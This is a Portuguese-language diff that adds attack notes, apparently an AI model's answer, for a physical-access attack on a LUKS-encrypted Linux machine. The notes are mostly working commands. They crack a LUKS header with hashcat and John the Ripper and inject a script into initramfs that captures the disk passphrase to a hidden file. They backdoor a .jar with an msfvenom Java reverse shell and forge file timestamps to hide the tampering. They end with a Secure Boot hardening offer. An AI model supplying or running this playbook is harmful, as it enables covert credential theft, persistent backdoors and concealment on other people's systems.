@@ -1,0 +1,202 @@
+dd if=/dev/sdX2 of=header.luks bs=512 count=32768
+# Ou usando cryptsetup
+cryptsetup luksHeaderBackup /dev/sdX2 --header-backup-file header.luks
+
+hashcat -m 14600 -a 0 header.luks wordlist.txt
+
+crunch 9 9 -t Admin%%%% -o wordlist_personalizada.txt
+
+# Sintaxe: crunch [min] [max] [caracteres] -o [arquivo]
+crunch 1 6 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist_bruta.txt
+
+Listar dispositivos OpenCL disponíveis: Verifique se o JtR reconhece sua placa de vídeo.
+john --list=opencl-devices
+
+Anote o "Device ID" da sua GPU (geralmente é 0 ou 1).
+
+Executar o Ataque: O formato para LUKS2 com OpenCL geralmente é luks2-opencl (ou apenas luks2 forçando o dispositivo, dependendo da versão).
+Bash
+
+# Comando completo:
+# --format: especifica o módulo OpenCL para LUKS2
+# --dev: especifica o ID da GPU (conforme visto no passo anterior)
+# --wordlist: o arquivo gerado pelo crunch
+# hash_luks.txt: o arquivo extraído no passo 1
+
+john --format=LUKS2-opencl --dev=1 --wordlist=wordlist_bruta.txt hash_luks.txt
+
+john --show hash_luks.txt
+
+Componente,Opção,Descrição
+hashcat,N/A,Chama o programa Hashcat.
+-m 14600,Modo de Hash,Define o tipo de hash a ser atacado. O código 14600 é o identificador que o Hashcat usa especificamente para o formato LUKS (Linux Unified Key Setup). Este modo instrui o Hashcat a esperar um cabeçalho LUKS no arquivo de entrada.
+-a 0,Modo de Ataque,"Define a forma como a quebra será realizada. O código 0 significa Attack Mode 0, que é o Ataque de Dicionário (Wordlist Attack). Isso instrui o Hashcat a simplesmente testar cada linha no arquivo de wordlist fornecido."
+-w 3,Carga de Trabalho,"Define o nível de utilização da GPU (Workload Profile). O valor 3 significa ""High"" (Alto), que é o padrão para testes de performance e pentests. Isso instrui o Hashcat a usar o máximo de recursos da sua placa de vídeo (GPU) para obter a velocidade máxima de cracking, mas pode tornar o computador menos responsivo para outras tarefas."
+hash_luks.txt,Arquivo Hash,"É o arquivo de entrada que contém o cabeçalho LUKS (o hash, o salt e os metadados), que foi extraído com o luks2john (ou uma ferramenta similar)."
+wordlist_bruta.txt,Arquivo de Dicionário,É o arquivo de dicionário (wordlist) que o Hashcat usará para testar as senhas. Ele testará cada linha deste arquivo contra o hash LUKS até encontrar uma correspondência.
+
+      * `lsblk` / `fdisk` (Manipulação de disco)
+      * `cpio` / `gzip` (Manipulação do Initramfs)
+      * `mount` / `umount`
+      * `msfvenom` (Do Metasploit, para payload Java)
+      * `zip` / `unzip` (Manipulação de arquivos .jar)
+      * `netcat` (Opcional, para testar shell reverso)
+
+    ```bash
+    lsblk -f
+    # ou
+    fdisk -l
+    ```
+
+    *Procure por partições `ext4` ou `vfat` (EFI) que não sejam do seu pendrive.*
+
+    Supondo que `/dev/nvme0n1p1` seja a EFI/Boot e `/dev/nvme0n1p2` seja a de módulos JVM.
+
+    ```bash
+    mkdir -p /mnt/alvo_boot
+    mkdir -p /mnt/alvo_jvm
+
+    mount /dev/nvme0n1p1 /mnt/alvo_boot
+    mount /dev/nvme0n1p2 /mnt/alvo_jvm
+    ```
+
+-----
+
+Ataque ao Initramfs (Keylogger de Boot)
+
+Este é o coração do ataque. O `initramfs` é um pequeno sistema de arquivos carregado na RAM antes do sistema real. Ele contém o executável `cryptsetup` que pede a senha. Vamos injetar um script nele.
+
+**O Passo a Passo:**
+
+1.  **Localizar e fazer backup do Initramfs original:**
+
+    ```bash
+    cd /mnt/alvo_boot
+    ls -lh
+    # Você verá algo como 'initrd.img-5.x.x-generic'
+    cp initrd.img-5.x.x-generic initrd.img.bak
+    ```
+
+2.  **Descompactar o Initramfs:**
+    Crie uma pasta de trabalho e extraia o conteúdo.
+
+    ```bash
+    mkdir /tmp/evil_work
+    cd /tmp/evil_work
+    zcat /mnt/alvo_boot/initrd.img-5.x.x-generic | cpio -idmv
+    ```
+
+3.  **Criar o Payload (O "Evil Script"):**
+    Você precisa interceptar a entrada do teclado. Existem várias formas, a mais comum é criar um wrapper falso para o comando de descriptografia ou injetar um hook no sistema de plymouth (tela de boot).
+
+    *Exemplo conceitual de script (injection):*
+    Vamos criar um script que roda antes do pedido de senha real, finge pedir a senha, salva em um arquivo de texto na partição de boot (que é clara) e depois deixa o boot seguir.
+
+    Edite o arquivo `/tmp/evil_work/init` (ou o script de hook apropriado para a distro, ex: `scripts/local-top/`):
+
+    ```bash
+    # (Este é um exemplo simplificado lógica)
+    echo "Digite a senha do disco (Luks):"
+    read -s PASSWORD
+    # Salva a senha em um arquivo oculto na partição de boot
+    echo "$PASSWORD" > /boot/config-dump.dat
+    # Passa a senha para o cryptsetup real para que o usuário não desconfie
+    echo -n "$PASSWORD" | /sbin/cryptsetup luksOpen /dev/nvme0n1p3 crypt_disk
+    ```
+
+4.  **Reempacotar o Initramfs infectado:**
+
+    ```bash
+    find . | cpio -H newc -o | gzip > /mnt/alvo_boot/initrd.img-5.x.x-generic
+    ```
+
+**O que acontece depois:** O usuário boota, digita a senha. O sistema abre normalmente. O atacante volta depois, monta a partição de boot novamente e lê o arquivo `config-dump.dat` com a senha em texto claro.
+
+-----
+
+### Passo 3: Ataque à Partição JVM (Backdoor de Aplicação)
+
+Se o ataque ao bootloader falhar (ou se quiser persistência na camada de aplicação), atacamos a partição de módulos.
+
+**Cenário:** Existe um arquivo `utils.jar` ou `app-core.jar` na partição `/mnt/alvo_jvm`.
+
+**O Passo a Passo:**
+
+1.  **Extrair o .jar legítimo:**
+
+    ```bash
+    cd /mnt/alvo_jvm
+    mkdir /tmp/jar_work
+    cp utils.jar /tmp/jar_work/
+    cd /tmp/jar_work
+    unzip utils.jar
+    rm utils.jar
+    ```
+
+2.  **Analisar o código (Information Leakage):**
+    Use o `grep` para buscar segredos em arquivos de configuração extraídos:
+
+    ```bash
+    grep -r "password" .
+    grep -r "api_key" .
+    grep -r "jdbc" .
+    ```
+
+3.  **Injetar Código Malicioso (Java Deserialization / Shell):**
+    Você pode usar o **msfvenom** para criar um payload java e substituir uma classe existente, ou injetar manualmente se souber programar em Java.
+
+    *Opção Rápida (Metasploit):*
+    Criar um `.jar` malicioso que abre uma conexão reversa.
+
+    ```bash
+    msfvenom -p java/shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f jar -o evil.jar
+    ```
+
+    *Nota:* Isso substituiria o jar inteiro. O ideal ("cirúrgico") é descompilar uma classe `.class` legítima, adicionar o código de execução do payload no método "main" ou no construtor da classe, recompilar e substituir apenas aquele arquivo `.class` dentro da estrutura de pastas.
+
+4.  **Reconstruir o .jar:**
+
+    ```bash
+    zip -r ../utils_infectado.jar *
+    mv ../utils_infectado.jar /mnt/alvo_jvm/utils.jar
+    ```
+
+    Agora, altere o timestamp do arquivo para parecer que nunca foi modificado:
+
+    ```bash
+    touch -r /mnt/alvo_jvm/outro_arquivo_antigo.jar /mnt/alvo_jvm/utils.jar
+    ```
+
+-----
+
+### Passo 4: Limpeza e Coleta (Exfiltração)
+
+1.  **Desmontar tudo:**
+    ```bash
+    umount /mnt/alvo_boot
+    umount /mnt/alvo_jvm
+    ```
+2.  **Desligar.**
+
+**O Retorno (Dias depois):**
+O atacante volta, boota o Live USB novamente:
+
+  * Monta a partição `/efi`.
+  * Lê o arquivo de texto com a senha capturada.
+  * Agora ele pode clonar o disco inteiro e descriptografar em casa, ou usar a senha para acessar o sistema ao vivo.
+
+-----
+
+### Resumo das Ferramentas Principais
+
+| Ferramenta | Uso no Pentest |
+| :--- | :--- |
+| **`lsblk` / `blkid`** | Identificar UUIDs e sistemas de arquivos não criptografados. |
+| **`cpio` & `gzip`** | Essencial para abrir (inflate) e fechar (deflate) arquivos `initrd.img`. |
+| **`dd`** | Se você quiser copiar o cabeçalho LUKS para tentar brute-force offline (caso não consiga o hook). |
+| **`chroot`** | Útil para simular o ambiente da vítima se você tiver acesso de escrita. |
+| **`jadx` ou `jd-gui`** | Para ler o código fonte dos `.jar` encontrados na partição JVM (engenharia reversa). |
+
+### Próximo Passo
+
+Dado que você está mapeando este risco, **gostaria que eu detalhasse como configurar o Secure Boot com chaves próprias (Machine Owner Key - MOK)** para impedir que o sistema aceite o `initramfs` ou `kernel` modificados que descrevemos acima?
